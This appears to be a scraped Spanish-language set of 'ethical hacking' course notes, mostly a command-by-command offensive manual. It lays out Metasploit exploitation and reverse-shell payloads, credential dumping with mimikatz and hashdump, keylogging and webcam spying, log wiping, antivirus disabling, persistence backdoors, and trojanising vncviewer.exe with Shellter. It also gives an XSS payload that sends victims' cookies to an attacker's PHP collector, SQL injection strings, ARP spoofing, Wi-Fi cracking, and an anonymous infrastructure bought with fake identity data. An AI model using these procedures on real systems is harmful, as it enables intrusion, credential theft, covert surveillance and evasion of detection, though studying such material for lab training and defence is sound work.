esta un peque\u00f1o manual de uso, esta p\u00e1gina es de los mismos creadores de metasploit y se actualiza peri\u00f3dicamente. Payloads Son las acciones a realizar justa al haber ejecutado el exploit. Ejemplos de payloads: windows/adduser # creaci\u00f3n de usuarios windows/vncinject/reverse_tcp # conexi\u00f3n vnc windows/shell/reverse_tcp # tunel inverso Estas payloads tambi\u00e9n tienen sus opciones de par\u00e1metro y se tendr\u00e1n que a\u00f1adir con set Explotar vulnerabilidad Para explotar una vulnerabilidad hay que cargar un exploit y un payload y a\u00f1adir sus parametros requeridos. en este caso explotaremos una vulnerabilidad de los dispositivos windows xp,2003 de smb. msfconsole workspace udemy # acceder al spacio de trabajo elejido search exploid ms08 # buscar el exploid que queremos use exploit/windows/smb/ms08_067_netapi # cargarlo show options # ver opciones requeridas set rhost 10 .0.0.10 # a\u00f1adir remote host requerido set payload windows/meterpreter/reverse_tcp # cargar payload de tunel inverso show options # ver opciones requeridas set lhost 10 .0.0.5 # a\u00f1adir local host requerido exploit # ejecutar ordenes meterpreter >_ # si todo a ido bien nos debuelve una shell en la victima Background Una vez conectado en un host interactivamente tendremos una terminal, y si queremos seguir con otras cosas podemos echar mano al background, que llega a ser tener diferentes sesiones de metasploit. metasploit@maquina-remota> background # o tambi\u00e9n Ctrl+Z dejar en segundo plano msf> sessions # ver sesiones abiertas ms> session -i 5 # acceder a la session 5 Importar datos de nmap Es posible que si tenemos datos de nmap previos importarlos y as\u00ed trabajar con ellos desde metasploit nmap 10 .0.0.5 -A -Pn -n -oX pruevas-windows.xml # ejecutar nmap dejando datos en salida xml msfconsole # entrar en metasploit msf> db_import /root/escaneos/pruevas-windows.xml # importar archivo msf> hosts # datos de hosts msf> services # datos de servicios # se puede ejecutar directamente nmap desde metasploit tambi\u00e9n msf> db_nmap -A 10 .0.0.5 filtrado hosts -c column,columna -S filtrado services -c columna,columna 10 .0.0.5 services -p 445 A\u00f1adir m\u00f3dulos mkdir /usr/share/metasploid-framework/modules/exploits/test # o si lo quieres solo para un usuario mkdir -p ~/.msf4/modules/exploits/test # a\u00f1dir el modulo dentro de test cp test-module.rb /usr/share/metasploid-framework/modules/exploits/test/ # recargar modulos en metasploit msf> reload_all msf> use exploits/test/test-module Generar archivo con payload msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost = 10 .1.1.22 lport = 4445 -e x86/shikata_ga_nai -i 3 -f exe -o test.exe msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp show options set lhost 10 .1.1.22 set lport 4445 exploit Post-explotaci\u00f3n En la post-explotaci\u00f3n ya estamos dentro del sistema vulnerable y este paso las tareas son: elevar privilegios, analizar comportamiento del usuario, an\u00e1lisis tr\u00e1fico red, abrir puertas traseras, acceder a otras redes. Extraer informaci\u00f3n del sistema siempre desde la terminal de metasploit> help use -l sysinfo getuid # usuario corriendo getpid # pid corriendo ps # procesos migrate 368 # cambiar a proceso 368 run checkvm # verificar si es una maquina virtual run get_env # ver variables de entorno run get_application_list # ver aplicaciones instaladas run scraper # exportar informaci\u00f3n del sistema run winenum # lo mismo con mas datos ~/.msf4/logs/scripts/scraper estos dos comandos exportan datos a la m\u00e1quina local, por lo tanto hacen mucho ruido Elevar privilegios getuid # ver privilegios actuales getsystem -h getsystem # levar privilegios a system getuid rev2self # volver a privilegios anteriores hashdump # ver credenciales usuarios, equivale a /etc/passwd Para que metasploit pese menos, no carga todas las librer\u00edas por defecto. Podemos cargar las opcionales a medida que las necesitamos. use mimikatz # cargar libreria mimikatz wdigest # ver credenciales use kiwi # cargar libreria kiwi creds_all # ver credenciales Eliminar rastros y sistemas de seguridad clearev # borrar visor de eventos shell # acceder a la shell del sistema # desactivar firewall netsh show opmode netsh firewall set opmode mode = disable profiles = all run killav #desactivar antivirus Espionaje keyscan_start # espiar movimiento de teclado keyscan_dump # exportar movimientos keyscan_stop screenshot # extraer sccreenshot del sistema run vnc # abrir ventana vnc record_mic 10 # grabar micro 10 segundos webcam_list webcam_snap 1 # extraer foto de camara 1 webcam_stream # extraer video en directo webcam_chat # abrir chat Snifer use sniffer sniffer_interfaces sniffer_start 1 1024 # numero de interfaz y buffer sniffer_dump 1 pruebas.pcap sniffer_stop 1 Backdoor run persistence -h run persistence -A -L c: \\\\ temp \\\\ -X -i 3600 -p 4443 -r 10 .1.1.22 # si a ido bien devolvera datos de lo que hace incluido donde aloja los scripts # para dejar que conecte automaticamente resource ~/.msf4/persistence/.../...rc # esto lo que hace es borrar los archivos del persistence -A ejecutar al arrancar -L localizaci\u00f3n del payload -X conectar en el boot de windows -i periodo de reintento en segundos Una vez que esta lanzado el persistence en la m\u00e1quina vulnerable, tenemos que abrir nuestro puerto para que se conecte. use exploit/multi/handler set payload windows/meterpreter/reverse_tcp show options set lhost 10 .1.1.22 set lport 4443 exploit Pivoting ipconfig background route add 10 .1.2.0/24 1 # el 1 es el numero de sesion route Conectar de windows a windows En el caso que queramos acceder desde un host windows a otro windows remotamente desde linea de terminal, es posible con psexec . Este se encuentra entre los ejecutables de pstools que podemos encontrar en las herramientas de windows. https://docs.microsoft.com/en-us/sysinternals/downloads/pstools # programa ip-destino dominio\\usuario contrase\u00f1a que-ejecutar psexec.exe \\\\ 10 .1.1.13 -u WIN7 \\p edro -p pedro123 cmd.exe El problema de esta opci\u00f3n es que tenemos que tener todos los datos. De shell a meterpreter Si por la raz\u00f3n que sea solo hemos podido acceder a un dispositivo windows desde una shell y queremos utilizar las utilidades de meterpreter, tenemos una posible soluci\u00f3n. use exploit/windows/smb/psexec set payload windows/shell/reverse_tcp set .... # a\u00f1adir opcione requeridas exploit C:> Ctl+Z # dejar sesion en 2\u00ba plano use post/multi/manage/shell_to_meterpreter set lhost ... set session ... run sessions # ver sesiones activas, ( se habra creado ua nueva ) sessions -i ... # entrar en sesion nueva Donde a\u00f1ado ... introducir el argumento por el payload o comando. Extraer credenciales Desde windows tenemos el programa mimikatz que entre otras cosas, nos permite extraer las credenciales de los usuarios con un sesi\u00f3n abierta, ya que mimikatz las extra los datos temporales cargados en ram. descargar mimikats: https://github.com/gentilkiwi/mimikatz/releases ejecutar el archivo exe con permisos de administrador de la arquitectura de vuestro sistema operativo. mimikatz.exe privilege::debug # comprobar privilegios sekurlsa::logonpasswords # extraer credenciales ram Bien ahora combinando psexec y mimikatz podr\u00edamos llegar a extraer los datos de la cuenta admin de un host remoto desde un usuario sin privilegios. psexec.exe \\\\ 10 .1.1.13 -u WIN7 \\p edro -p pedro123 -c mimikatz privilege::debug sakurlsa::logonpasswords exit > crecenciales.txt Ophcrack Es un programa tanto instalable como portable que extrae los hash el sistema y tiene la posibilidad de crackear mediante fuerza bruta los hashes. Procdump Es otro programa de windows para extraer hash del sistema, este los extrae en un formato .dmp para posteriormente descifrarlo con mimikatz u otros. Los archivos que utiliza para esta extracci\u00f3n son windows/system/config/{sam,system} procdump.exe -na lsass.exe lsassdump -accepteula mimikatz.exe sekurlsa::minidump lsassdump.dmp sekurlsa::logonpasswords unshadow/john Estos son 2 comandos de linux donde juntan los usuarios con sus contrase\u00f1as cifradas en un archivo, para posteriormente descifrarlas mediante fuerza bruta. unshadow /etc/passwd /etc/shadow > hash-unix john hash-unix Fuerza bruta Esta la posibilidad de utilizar fuerza bruta para resolver contrase\u00f1as, hay diferentes m\u00e9todos: profundidad: 1 usuario muchas contrase\u00f1as anchura: muchos usuarios y una contrase\u00f1a profundidad/anchura: muchos usuarios y muchas contrase\u00f1as. Estos procesos son muy lentos y en seg\u00fan que casos el servicio puede bloquearnos por el uso excesivo de pruebas, en todo caso este m\u00e9todo hace uso de diccionarios, es decir una lista muy grande de posibilidades e ir probando hasta que alguna coincida. hydra -L users -p Soc123 -vV 10 .1.1.5 smb # diccionario de usuarios a 1 contrase\u00f1a hydra -l soc -P paswords -vV 10 .1.1.5 smb # diccionario de passwords a 1 usuaro hydra -L users -P paswords -vV 10 .1.1.5 smb # diccionario de users y passwords M\u00f3dulos de medusa /usr/lib/medusa/modules medusa -u soc -p soc1234 -h 10 .0.0.5 -M smb ncrack -p 445 --user soc --pass soc123 10 .0.0.5 ncrack -p 445 -U users --pass soc123 10 .0.0.5 Evadir antivirus Podemos ver si un archivo se detecta como malicioso para los antivirus con diversas aplicaciones como virustotal o nodistribute , esto nos puede interesar a la hora de crear un ejecutable malicioso subirlo primero a una de estas aplicaciones, comprobar su efectividad y distribuirlo si fuera necesario. Hay que decir que virustotal tiene una base de datos de antivirus m\u00e1s grande, pero reporta a las empresa los virus detectados, as\u00ed que seg\u00fan que quieras hacer es mejor no subirlo en dicha p\u00e1gina. Con msfvenom podemos crear ejecutables maliciosos, el inconveniente es que casi todos los antivirus lo detectan. msfvenom -p windows/meterpreter/reverse_tcp LHOST = 10 .0.0.5 LPORT = 4444 -f exe > /tmp/shell.exe veil-evasion Proporciona payloads con cripters, es decir aporta diferentes payloads con diferentes capas de encriptado para que los antivirus le cueste detectar que es un ejecutable malicioso. instalar dependencias: Install Python 2.7, Py2Exe, PyCrypto, and PyWin32 on a Windows computer (for Py2Exe). instalaci\u00f3n: apt-get -y install git git clone https://github.com/Veil-Framework/Veil-Evasion.git cd Veil-Evasion/ cd setup setup.sh -s m\u00e9todo de uso: python vail-evasion.py list # listar payloads use 47 # utilizar payload 47 set lhost 10 .0.0.5 # a\u00f1adir opci\u00f3n requerida generate # generar exe shellter Shellter es de las mejores opciones enmascarando un ejecutable malicioso, ya que permite introducir un ejecutable dentro de otro, por lo tanto el usuario abrir\u00e1 el ejecutable interactuar\u00e1 con el programa principal, y en segundo plano nuestro ejecutable interno se ejecutara en segundo plano. directorio de producci\u00f3n /usr/share/shellter directorio donde encontramos los binarios de windows /usr/share/windows-binaries/ En el siguiente ejemplo introducimos un reverse_tcp en un ejecutable vnc . apt install shellter cd /usr/share/shellter cp /usr/share/windows-binaries/vncviewer.exe ./ shellter # abrir shelter vncviewer.exe # binario a utilizar Enable Stealth Mode? # habilitar que se ejecute el payload en segundo plano Y Use a listed payload or custom? # utilizare un payload de la lista L select payload by index: # el Meterpreter_reverse_TCP en lalista es el 1 1 set lhost 10 .0.0.7 # donde se va a conectar set lport 8888 # por que puerto # ya podemos recoger nuestro archivo vncviewer.exe modificado del directorio actual. Usarlo: abrir puerto en linux msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10 .0.0.7 set lport 8888 exploit ejecutar en un windows el vmviewer.exe que hemos modificado y se conectara autom\u00e1ticamente al linux en la consola del meterpreter. Evadir autenticaci\u00f3n Existen diferentes formas de evadir la autenticaci\u00f3n de sistemas operativos. Una buena manera en windows es con el programa kon-bootcd que es una iso booteable y ella sola se encarga de todo. https://archive.org/details/Kon-bootForCD Tambi\u00e9n est\u00e1n otros m\u00e9todos como DLC, Hirens y otros Desde linux siempre esta la opci\u00f3n de arrancar en modo emergency siempre y cuando el grub te lo permita. vulnerabilidades en aplicaciones web Metodolog\u00eda Mapeo y an\u00e1lisis de la aplicaci\u00f3n Analizar toda la aplicaci\u00f3n, detectar contenido oculto, identificar funcionalidades como put delete, identificar que tecnolog\u00edas utiliza. Pruebas en los controles del cliente Pruebas en el mecanismo de autenticaci\u00f3n Analizar el proceso de autenticaci\u00f3n, enumerar usuarios, funcionalidad recordar credenciales. Pruebas en el manejo de sesiones Analizar la sesi\u00f3n que se crea, como y cuanto tarda, verificaci\u00f3n de tokens y cookies, fijaci\u00f3n de sesiones, cross-site request fotgety enlace malicioso que cambia credenciales de usuario etc.. Pruebas en el control de autorizaci\u00f3n Elevaci\u00f3n privilegios vertical de user a admin etc.. o lateral de user1 a user2. Pruebas en la l\u00f3gica de la aplicaci\u00f3n Pensar en algo que el desarrollador no aya pensado para modificar la web Ataques conocidos owasp es un proyecto que facilita las auditorias en aplicaciones web, su propia web te facilita diferentes aplicaciones para auditar como para entrenar tus conocimientos. pentesterlab es otra web donde practicar y encontrar recursos para auditorias. Herramientas mantra es un navegador tuneado donde encuentras una serie de plugins muy \u00fatiles para la auditoria web. burpsuit , zap proxy ,: Son proxys de intercepci\u00f3n de peticiones, con ellos podr\u00e1s interceptar una petici\u00f3n , modificarla para luego mandarla con con las modificaciones asignadas. dirbuster fuerza bruta a contenido oculto de una web xss xss es un tipo de vulnerabilidad donde una aplicaci\u00f3n web te permite ejecutar c\u00f3digo en un cuadro de texto. Este vulnerabilidad es muy utilizada en aplicaciones como facebook, etc.. para extraer credenciales. Se manda un enlace con el c\u00f3digo camuflado para que la victima clique y sin enterarse haga una acci\u00f3n en segundo plano. por ejemplo: En el siguiente ejemplo se ejecutara c\u00f3digo en un cuadro de texto para extraer las cookies de un usuario y mand\u00e1rselas remotamente a otro. crear una web que ejecute php y insertar este archivo para recibir las cookies mediante url y almacenarlas en cookies_list.txt cookies.php <?php $handle = fopen ( \"cookies_list.txt\" , \"a\" ); fputs ( $handle , \" \\n \" . $_GET [ \"cookie\" ] . \" \\n \" ); fclose ( $handle ); ?> comprobar que funciona 10.1.1.3/cookies.php?cookie=test c\u00f3digo a inyectar mediante xss < script > var i = new Image (); i . src = \"http://10.1.1.3/cookies.php?cookie=\" + document . cookie ;</ script > este c\u00f3digo hay que insertarlo dentro de alg\u00fan cuadro de texto vulnerable y mediante un acortador de url como https://bitly.com/ crear un link. Una vez recogidas las coockies, con mantra u otro insertarnos las cookies estraidas para acceder a la sesi\u00f3n de la victima. Evasi\u00f3n de filtros https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion https://html5sec.org/ sql injection https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF # extraer bases de datos 10.1.1.9/sqli/example1.php?name=root'+and+'1'='0'+union+select+1,schema_name,3,4,5+from+information_schema.schemata+--+- existe la tabla exercises # extraer tablas 10.1.1.9/sqli/example1.php?name=root'+and+'1'='0'+union+select+1,table_name,3,4,5+from+information_schema.tables+where+table_schema='exercises'+--+- existe la tabla users # extraer columnas 10.1.1.9/sqli/example1.php?name=root'+and+'1'='0'+union+select+1,column_name,3,4,5+from+information_schema.columns+where+table_name='users'+--+- sqlmap sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" --dbs sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" -D exercices --tables sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" -D exercices -T users --columns sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" -D exercices -T users --dump sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" --sql-shell vulnerabilidades en red An\u00e1lisis de trafico Existen diferentes programas con los que podemos analizar el trafico en la red, el mas conocido wireshark que analiza todo el trafico, tambi\u00e9n existen otros como network miner que de forma pasiva va extrayendo datos de los paquetes que van circulando por la red y mostr\u00e1ndolos de forma ordenada. intercepci\u00f3n de trafico (man in the midle) De forma manual podemos ponernos entre medio de la victima y el router para interceptar todo el trafico de un dispositivo. Siempre que estemos en una red local podemos indicar que nuestro dispositivo pueda hacer pas forwarding y seguidamente mediante arpspoof indicar a un host que nosotros somos el router. echo \"1\" > /proc/sys/net/ipv4/ip_forward # prg interficie victima router arpspoof -i eth0 -t 10 .1.1.32 10 .1.1.1 realmente lo que hace arpspoof es mandar a la victima paquetes de que mi mac es la perteneciente va la ip del router. De forma autom\u00e1tica podemos utilizar bettercap que se encarga de realizar todo el proceso autom\u00e1ticamente, adem\u00e1s de tener funcionalidades extra. arp-scan 10 .1.1.0/24 # ver numero de dispositivos en una red bettercap --help bettercap -X # man in de middle a todos los dispositivos de la red bettercap -T 10 .1.1.32 --proxy -P POST # solo una victima Desde windows existen programas como cain que podemos hacer el man in de middle f\u00e1cilmente. Es un programa portable que solo tendr\u00e1s que configurar la secci\u00f3n apr que ser\u00e1 entre que dispositivos quieres estar y listo. dhcp falso echo \"1\" > /proc/sys/net/ipv4/ip_forward msfconsole use auxiliary/server/dhcp show options set broadcast 10 .1.1.255 # rango a dar set dhcpipend 10 .1.1.200 set dhcpipstart 10 .1.1.190 set dnsserver 8 .8.8.8 set netmask 255 .255.255.0 set router 10 .1.1.22 # mi direccion ip, me are pasar por el router set srvhost 10 .11.22 # servidor dhcp exploit vulnerabilidades wifi modo monitor Este modo sirve para que nuestra tarjeta se ponga a la escucha del trafico de la red, no solo el nuestro si no el de todo el mundo si estamos en un entorno wifi. airmon-ng check kill airmon-ng start wlan0 airodump-ng wlan0mon # ver redes ssid bssid potencia de red chanel, etc... airmon-ng stop wlan0mon redes wep capturar pequetes red especifica airodump-ng -c 6 --bssid mac-del-router -w file-trafic wlan0mon asociarte al punto de acceso aireplay-ng -1 0 -e pruebas -a mac-del-router -h mac-cliente wlan0mon escuchar paquetes arp aireplay-ng -3 -b mac-router -h mac-cliente wlan0mon desautenticar cliente aireplay-ng -0 1 -a mac-router -c mac-cliente wlan0mon craquear aircrack-ng file-trafic redes wpa/wpa2 airmon-ng start wlan0 # extraer handshake y parar la escucha airodump-ng -c 6 --bssid mac-router -w file-trafic-wpa wlan0mon # intntar craquear handshake con diccionario local aircrack-ng -w /usr/share/wordlists/rockyou.txt file-trafic-wpa autom\u00e1tico De forma autom\u00e1tica se puede intentar vulnerar una red con wifite ya vque por debajo esta utilizando aircrack . wifite indicar en el listado la red","title":"Haking \u00e9tico"},{"location":"auditoria/apuntes_hacking/#haking-etico","text":"","title":"Haking \u00e9tico"},{"location":"auditoria/apuntes_hacking/#nociones-basicas","text":"","title":"Nociones b\u00e1sicas"},{"location":"auditoria/apuntes_hacking/#ambitos-de-la-seguridad","text":"\u00c1mbito f\u00edsico identificar medidas de seguridad, accesos alternativos, evasion de control de acceso RFIC/NFC ( targeta de acceso ), evasi\u00f3n control biometrico, wireles, wifi. \u00c1mbito Digital anonimacion de las comunicaciones, analisis servicios p\u00fablicos, dominios internos, todo lo relacionado al software. \u00c1mbito humano el objetivo de este \u00e1bito es enga\u00f1ar al usuario mediante, vishing ( llamadas telefonicas ), usb cebo, mails con malware , suplantaci\u00f3n de identidad, ingenieria social etc...","title":"\u00c1mbitos de la seguridad"},{"location":"auditoria/apuntes_hacking/#pruebas-acotadas-dentro-de-hacking-etico","text":"Ejercicios Read Team. Simulaci\u00f3n de un ataque real donde la empresa desconoce las acciones que van a ser realizadas, cuando y por quien. Test de Intrusi\u00f3n. Pruebas de intrusi\u00f3n con un alcance limitado, donde existe colaboraci\u00f3n entre auditor y empresa. En este caso el \u00e1mbito de actuaci\u00f3n esta definido, la organizaci\u00f3n conoce de parte de los detalles que se ejecutaran y se verifican vulnerabilidades y se explotan de manera limitada. Auditor\u00eda de Vulnerabilidades Identificaci\u00f3n de vulnerabilidades conocidas. Suele estar dirigido a los servicios que especifica la empresa y \u00fanicamente se identifican las vulnerabilidades de dichos servicios.","title":"Pruebas acotadas dentro de Hacking \u00c9tico"},{"location":"auditoria/apuntes_hacking/#tipos-de-enfoques","text":"Caja Negra: El desconocimiento completo de cualquier informaci\u00f3n referente al activo a auditar. Este tipo de enfoque es el mas real ya que se simula un atacante real ya que desconoce todos los servicios. Caja Negra con Post-Autentificaci\u00f3n: \u00danicamente se tienen las credenciales de acceso. Este tipo de enfoque se realiza para prevenir vulnerabilidades de m\u00e9todo interno o en lugares que se permite acceder a una red publica etc... Caja gris: Conocimiento parcial del activo a auditar. Caja blanca: Conocimiento completo del activo. Este m\u00e9todo al tener el conocimiento total del activo se pueden identificar el total de las vulnerabilidades de los servicios del activo.","title":"Tipos de enfoques"},{"location":"auditoria/apuntes_hacking/#vectores-de-ataque","text":"Ataque dirigido. los ataques dirigidos consiste en un ataque a un objetivo en concreto, se suelen seguir los siguientes pasos. Reconocimiento: de informaci\u00f3n de la empresa o victima a atacar, consiste en identificar todos los posibles accesos. vector de acceso: localizar el acceso m\u00e1s vulnerable y acceder a el mismo. persistencia: una vez dentro asegurarse de que si cierran un m\u00e9todo de entrada puedas acceder por otro, infectando m\u00faltiples dispositivos. movimiento lateral: poder acceder a diferentes redes de la victima y asegurar un libre acceso entre ellas. acceso a los datos: Tener acceso y control de los datos de la victima. Extracci\u00f3n: extraer los datos. Ataque no dirigido Los ataques no dirigidos se lanzan a multitud de dispositivos sin saber su destino. malware : infectar un dispositivo insertando alg\u00fan tipo de programa malicioso. phishing : suplantar la identidad e bancos, polic\u00eda para extraer datos del usuario explotaci\u00f3n masiva : infectar mayor n\u00famero de dispositivos posibles para en un futuro tener el control y hacer un ataque masivo.","title":"Vectores de ataque"},{"location":"auditoria/apuntes_hacking/#dispositivos-de-seguridad","text":"Firewall ( cortafuegos ) Es un software o hardware que es capaz de filtrar el trafico entrante y saliente de la red para prevenir el acceso no deseado a las redes protegidas. red desmilitarizada (DMZ) Es una red aislada intermedia entre internet y la red interna de la organizaci\u00f3n. En este tipo de redes tenemos un primer firewall desde el router a los servidores p\u00fablicos y un segundo firewall para la red interna, de esta manera desde el exterior se podra acceder a los servidores p\u00fablicos y la red interna seguira protegida. Honeypot Es un dispositivo que simula los servicios o dispositivos de nuestra red. esto sirve para que el atacante pierda tiempo intentando manipular estos dispositivos ya que se muestran mas vulnerables y a la vez nos avisa que alguien esta dentro de nuestra red. Sistema de detecci\u00f3n de intrusos (IDS) NIDS: intenta identificar comportamientos an\u00f3malos en la red HIDS: intenta identificar comportamientos an\u00f3malos en los hosts Firewall de aplicaci\u00f3n web (WAF) es un sistema que se pone delante de una aplicaci\u00f3n web e intenta identificar si se esta ejecutando alg\u00fan tipo de ataque y lo corta.","title":"Dispositivos de seguridad"},{"location":"auditoria/apuntes_hacking/#laboratorio-de-pruebas","text":"metasploitable I, II y III: distribuciones dise\u00f1adas para aprender a vulnerar sistemas y servicios. https://www.vulnhub.com/entry/metasploitable-1,28/ https://www.vulnhub.com/entry/metasploitable-2,29/ Web for pentester I y II: vulnerar aplicaciones webmediante la especificaci\u00f3n de diferentes tecnicas y la necesidad de evadir filtros. https://download.vulnhub.com/dvwa/ Owasp broken web applications project: maquina virtual que desplega una gran cantidad de servicios web vulnerables. https://sourceforge.net/projects/owaspbwa/files/ Existen aplicacciones web que se encargan de recopilar maquinas vulnerables. www.vulnhub.com","title":"Laboratorio de pruebas"},{"location":"auditoria/apuntes_hacking/#introduccion-kali","text":"escanear pagina de cisco, extraer ip's de dominios wget https://www.cisco.com grep \"href=\" index.html | cut -d \"/\" -f3 | grep \"\\.\" | cut -d '\"' -f1 | sort -u > dominios.txt for dom in $( cat dominios.txt ) ; do host $dom | grep \"has address\" | cut -d \" \" -f4 ; done | sort -u > ips_cisco.txt","title":"Introducci\u00f3n Kali"},{"location":"auditoria/apuntes_hacking/#anonimato","text":"","title":"Anonimato"},{"location":"auditoria/apuntes_hacking/#tunelizacion-de-protocolos","text":"consiste en de encapsular un protocolo dentro de otro creando un t\u00fanel. Es utilizado para transformar un protocolo determinado que com\u00fanmente no se permite en una red. para que este proceso sea efectivo tanto cliente como servidor deben establecer los par\u00e1metros de tunelizaci\u00f3n y protocolos que van a utilizar. un ejemplo ser\u00eda camuflar trafico SSH a trav\u00e9s del trafico HTTP, se utilizar\u00eda el tunel del HTTP para enviar trafico SSH.","title":"Tunelizaci\u00f3n de protocolos"},{"location":"auditoria/apuntes_hacking/#servidores-proxy","text":"Un servidor proxy funciona como punto intermedio entre el cliente y el servidor redireccionando las peticiones y respuestas de forma transparente entre ambas. Esto permite ocultar la direcci\u00f3n IP real del cliente, ya que el servidor ver\u00eda unicamente la direcci\u00f3n IP del proxy. Si a esto le sumas un encadenamiento de proxys en diferentes paises o continentes, el trabajo para descubrir la IP origen es mas tedioso.","title":"Servidores proxy"},{"location":"auditoria/apuntes_hacking/#virtual-private-network-vpn","text":"Es una tecnolog\u00eda que permite crear conexiones privadas entre dos puntos utilizando una red publica como internet. El funcionamiento es que estableces una conexi\u00f3n segura con el servidor VPN y desde all\u00ed sales a internet. Podemos encontrar servicios VPN tanto de pago como gratuitos distribuidos por distintos paises. muy utilizado para evitar intercepciones de 5rafico, conexiones seguras en sitios publicos y anonimizar conexiones.","title":"Virtual Private Network (VPN)"},{"location":"auditoria/apuntes_hacking/#redes-de-anonimacion","text":"TOR Es la red an\u00f3nima mas conocida a d\u00eda de hoy. Consiste en una red completamente centralizada que aporta anonimato en la navegaci\u00f3n por internet, as\u00ed como acceso a la red de TOR. Este funciona conectandose a traves de varias capas de cifrado en la red de tor, pasando por varios nodos de dicha red y finalmente salir de la red de tor a la red comun sin cifrar pero sin la posibilidad de saber quien eres. A no ser que en dicho mensaje hayan datos personales, por eso mismo no se deve acceder a sitios con identificaci\u00f3n como email, dni, etc... FREENET/I2P Estas dos opciones son muy similares y lo que permiten es tener acceso a la red oculta dentro de internet denominada como Dark Net o Deep Web , esta red tiene la peculiardad de ser una red descentralizada.","title":"Redes de anonimaci\u00f3n"},{"location":"auditoria/apuntes_hacking/#proxy","text":"Proxychain Es un proxy para enrutar programas, comandos desde el terminal, su configuraci\u00f3n es muy sencilla igual que su modo de uso. Su configuraci\u00f3n se encuentra en /etc/proxychain.conf # modo vervose #quiet_mode # pasar dns por proxy (recomendado) proxy_dns al final del todo, puedes poner tantos como quieras, por defecto viene configurado tor, pero lo puedes quitar o a\u00f1adir debajo los proxys que quieres que valla recorriendo. # tipo de conexion ip puerto user pasword # defaults set to \"tor\" #socks4 127.0.0.1 9050 socks4 88 .78.73.116 1080 Utilizar proxychains con wget. canihazip es una web que nos dice que ip publica tenemos, utilizando proxychains mostrara que tenemos la ip publica 88.78.73.116 proxychains wget http://canihazip.com/s Foxyproxy Un plugin del navegador donde puedes configurar tus proxy y cambiar entre ellos r\u00e1pidamente.","title":"Proxy"},{"location":"auditoria/apuntes_hacking/#vpn","text":"Con una VPN creas un t\u00fanel seguro hasta el servidor de la VPN y sale tu conexi\u00f3n de all\u00ed a la red. existen VPN gratuitas o opensource como openvpn o de pago . Vpn de pago: Estos servicios de pago normalmente tienen un software de instalaci\u00f3n para su utilizaci\u00f3n sencilla. Adem\u00e1s te permite conectar a trav\u00e9s de diferentes pa\u00edses ya que tienen servidores distribuidos por los diferentes continentes. ExpressVPN - Caribe NordVPN - Panama TorGuard - Antillas IPredator - Chipre PureVPN - Hong kong","title":"VPN"},{"location":"auditoria/apuntes_hacking/#cambiar-mac","text":"En ocasiones es \u00fatil cambiar la mac de un ordenador para burlar listas blancas etc... windows administrador de dispositivos adaptadores de red opciones avanzadas direcci\u00f3n administrada localmente --> valor linux ifconfig eth0 down macchanger -m 00 :11:22:33:44:55 eth0 ifconfig eth0 up # cambio random macchanger -r # cambio permanente macchanger -p","title":"Cambiar Mac"},{"location":"auditoria/apuntes_hacking/#creando-plataforma-anonima","text":"Para crear una plataforma an\u00f3nima (\"legalmente\") se han de seguir diferentes pasos. Contrataci\u00f3n an\u00f3nima de servidores VPS distribuidos en diferentes lugares ( comprarlos o alquilarlos con bitcoins y datos falsos ). Enlazar los servidores con t\u00faneles para un manejo fluido a la hora de ejecutar operaciones.","title":"Creando plataforma an\u00f3nima"},{"location":"auditoria/apuntes_hacking/#creando-tuneles","text":"Activar ssh en todos los vps host1 192 .168.122.1 host2 192 .168.122.2 host3 192 .168.122.3","title":"Creando t\u00faneles"},{"location":"auditoria/apuntes_hacking/#tunel-estatico","text":"Un t\u00fanel est\u00e1tico redirige las peticiones de un puerto local a otro host remoto en el puerto indicado. # desde host2 # se conecta a host3 y se deja el tunel abierto ssh -L 1234 :192.168.122.3:22 root@192.168.122.3 # desde otra terminal de host2 ssh root@127.0.0.1 -p 1234 root@host3:~ $_ Esta opci\u00f3n 1234:192.168.122.3:22 ejecutada desde host2 esta diciendo, abre el puerto 1234 en host2 y todo lo que entre por ah\u00ed, lo rediriges a host3 en el puerto 22. Por eso al hacer el ssh en al puerto 1234 en host2 conectas a host3.","title":"T\u00fanel Est\u00e1tico"},{"location":"auditoria/apuntes_hacking/#tunel-dinamico","text":"Un t\u00fanel din\u00e1mico redirige las peticiones de un puerto local a otro host remoto sin importar el puerto destino. # desde host2 # establezco tunel dinamico desde host2 a host3 ssh -D 1234 root@192.168.122.3 # host2 tiene abierto el puerto 1234 y redirige a host3 # desde otra terminal en host2 configuro proxychains para conectar con el puerto que acabo de abrir. cp /etc/proxychains.cong ./ vim proxychains.conf # ultima linea 127 .0.0.1 1234 # ahora todo lo que se ejecute con proxychains se reenviara a host3 root@host2~$ proxychains ssh root@127.0.0.1 root@host3~ $_ Esto al ser solo un salto entre host no tiene mucho sentido ya que arias un ssh simple y ya. todo cobra sentido al a\u00f1adir mas hosts en la ecuaci\u00f3n.","title":"T\u00fanel din\u00e1mico"},{"location":"auditoria/apuntes_hacking/#secuencia-de-tuneles","text":"En este caso crearemos una mezcla de t\u00faneles din\u00e1micos y est\u00e1ticos, el host final con el pen\u00faltimo tendr\u00e1n un t\u00fanel din\u00e1mico para poder lanzar cualquier tipo de petici\u00f3n, todos los dem\u00e1s host de la cola se conectaran mediante t\u00faneles est\u00e1ticos para saber por que puerto seguir dicha cola. Utilizaremos 3 host porque poner mas es repetir lo mismo una y otra vez, host3 sera el host final, conectara el host2 con el host3 mediante un t\u00fanel din\u00e1mico y luego el host1 conectara con host2 mediante un t\u00fanel est\u00e1tico. De esta manera los comandos ejecutados desde el host1 saldr\u00e1n por el host3. # desde host2 # establezco tunel dinamico desde host2 a host3 ssh -D 1234 root@192.168.122.3 # host2 tiene abierto el puerto 1234 y redirige a host3 # desde otra terminal en host2 configuro proxychains para conectar con el puerto que acabo de abrir. cp /etc/proxychains.cong ./ vim proxychains.conf # ultima linea 127 .0.0.1 1234 # desde host1 cp /etc/proxychains.cong ./ vim proxychains.conf # ultima linea 127 .0.0.1 4321 # crear t\u00fanel est\u00e1tico y dejar abierto ssh -L 4321 :127.0.0.1:1234 